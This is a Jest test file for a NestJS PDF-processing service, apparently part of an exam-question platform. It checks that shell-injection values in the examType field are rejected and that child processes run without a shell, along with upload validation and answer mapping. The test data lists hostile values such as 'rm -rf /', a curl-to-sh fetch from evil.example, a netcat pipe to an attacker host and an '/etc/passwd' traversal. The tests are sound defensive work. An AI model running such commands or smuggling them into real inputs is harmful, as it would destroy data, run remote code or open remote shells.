import { BadRequestException } from '@nestjs/common';

const execFileMock = jest.fn();

// `promisify(execFile)` reads the custom promisified symbol, so the mock has to
// carry one — otherwise promisify wraps the callback form and never resolves.
jest.mock('child_process', () => {
  const symbol = require('util').promisify.custom;
  const execFile: any = (...args: any[]) => execFileMock(...args);
  execFile[symbol] = (...args: any[]) => execFileMock(...args);
  return { execFile };
});

jest.mock('../../config/supabase.config', () => ({
  supabase: {
    storage: { from: () => ({ upload: jest.fn(), getPublicUrl: jest.fn() }) },
    from: () => ({ insert: () => Promise.resolve({ error: null }) }),
  },
}));

import { PdfProcessorService } from './pdf-processor.service';

const gatewayStub = { emitProgress: jest.fn() } as any;

/** A buffer that passes the %PDF- magic-byte check. */
const pdfBuffer = (body = 'x'.repeat(200)) => Buffer.from(`%PDF-1.7\n${body}`, 'latin1');

describe('PdfProcessorService', () => {
  let service: PdfProcessorService;

  beforeEach(() => {
    jest.clearAllMocks();
    execFileMock.mockResolvedValue({ stdout: '', stderr: '' });
    service = new PdfProcessorService(gatewayStub);
  });

  /**
   * `examType` reaches a child process. It used to be interpolated into a shell
   * string (`--exam ${examType}` passed to `exec`), which let any authenticated
   * teacher run arbitrary commands on the API host.
   */
  describe('examType handling', () => {
    it.each([
      'jee; rm -rf /',
      'jee && curl evil.example/x | sh',
      'jee`whoami`',
      'jee$(id)',
      'jee | nc attacker 4444',
      '../../etc/passwd',
    ])('rejects %p rather than passing it to a child process', async (examType) => {
      await expect(service.processPdf(pdfBuffer(), 'teacher-1', examType)).rejects.toBeInstanceOf(
        BadRequestException,
      );

      expect(execFileMock).not.toHaveBeenCalled();
    });

    it.each(['jee', 'neet', 'cbse', 'general', 'JEE', ' neet '])(
      'accepts the supported taxonomy %p',
      async (examType) => {
        // Extraction runs, then the manifest read fails — which is fine: by then
        // the argument handling under test has already happened.
        await expect(service.processPdf(pdfBuffer(), 'teacher-1', examType)).rejects.toBeDefined();
        expect(execFileMock).toHaveBeenCalled();
      },
    );

    it('passes arguments as an argv array with no shell', async () => {
      await service.processPdf(pdfBuffer(), 'teacher-1', 'neet').catch(() => undefined);

      // First call is extract.py, second is classify.py.
      expect(execFileMock).toHaveBeenCalledTimes(2);
      const [, classifyArgs, classifyOpts] = execFileMock.mock.calls[1];

      expect(Array.isArray(classifyArgs)).toBe(true);
      // The value travels as its own argv entry — never concatenated into a string.
      expect(classifyArgs).toContain('--exam');
      expect(classifyArgs[classifyArgs.indexOf('--exam') + 1]).toBe('neet');
      expect(classifyOpts.shell).toBe(false);
      expect(classifyOpts.timeout).toBeGreaterThan(0);
    });
  });

  describe('file validation', () => {
    it('refuses an empty upload', async () => {
      await expect(service.processPdf(Buffer.alloc(0), 'teacher-1', 'jee')).rejects.toThrow(
        /no pdf/i,
      );
    });

    /** A renamed .exe still has the wrong magic bytes. */
    it('refuses a file that is not actually a PDF', async () => {
      await expect(
        service.processPdf(Buffer.from('MZ\x90\x00 not a pdf'), 'teacher-1', 'jee'),
      ).rejects.toThrow(/not a pdf/i);

      expect(execFileMock).not.toHaveBeenCalled();
    });
  });

  describe('resolveInside', () => {
    const resolveInside = (root: string, rel: string) =>
      (service as any).resolveInside(root, rel);

    it('rejects a manifest path that climbs out of the run directory', () => {
      expect(resolveInside('/runs/abc', '../../etc/passwd')).toBeNull();
      expect(resolveInside('/runs/abc', '/etc/passwd')).toBeNull();
    });

    it('accepts a path that stays inside', () => {
      expect(resolveInside('/runs/abc', 'classified/Physics/Optics/numerical/q1.png')).toBeTruthy();
    });
  });

  /**
   * Every extracted question used to be stored as `single_correct`, so a
   * numerical question reached students as a four-option MCQ they could not
   * answer. The type now comes from the classifier — but the manifest is a file
   * on disk, so a value the question bank does not know must not reach the
   * insert and fail the whole batch.
   */
  describe('resolveQuestionType', () => {
    const resolve = (value: unknown) => (service as any).resolveQuestionType(value);

    it.each(['single_correct', 'multi_correct', 'numerical', 'assertion'])(
      'keeps the supported type %p',
      (type) => {
        expect(resolve(type)).toBe(type);
      },
    );

    it('normalises casing and surrounding space', () => {
      expect(resolve('  Numerical ')).toBe('numerical');
    });

    it.each([undefined, null, '', 'matrix_match', 42, {}])(
      'falls back to single_correct for %p',
      (value) => {
        expect(resolve(value)).toBe('single_correct');
      },
    );
  });

  describe('buildCorrectAnswer', () => {
    const build = (qType: string, item: any) => (service as any).buildCorrectAnswer(qType, item);

    it('gives a multi-correct question the indices shape the grader matches on', () => {
      expect(build('multi_correct', { answer_indices: [0, 2] })).toEqual({ indices: [0, 2] });
    });

    it('gives a numerical question the printed value', () => {
      expect(build('numerical', { answer_value: '2.50' })).toEqual({ value: '2.50' });
    });

    it('gives a single-correct question the first answered index', () => {
      expect(build('single_correct', { answer_indices: [1] })).toEqual({ index: 1 });
    });

    /** No printed answer key: the reviewer supplies it before approval. */
    it('falls back to a placeholder when the paper printed no answer', () => {
      expect(build('single_correct', {})).toEqual({ index: 0 });
      expect(build('multi_correct', {})).toEqual({ indices: [] });
      expect(build('numerical', {})).toEqual({ value: null });
    });
  });
});
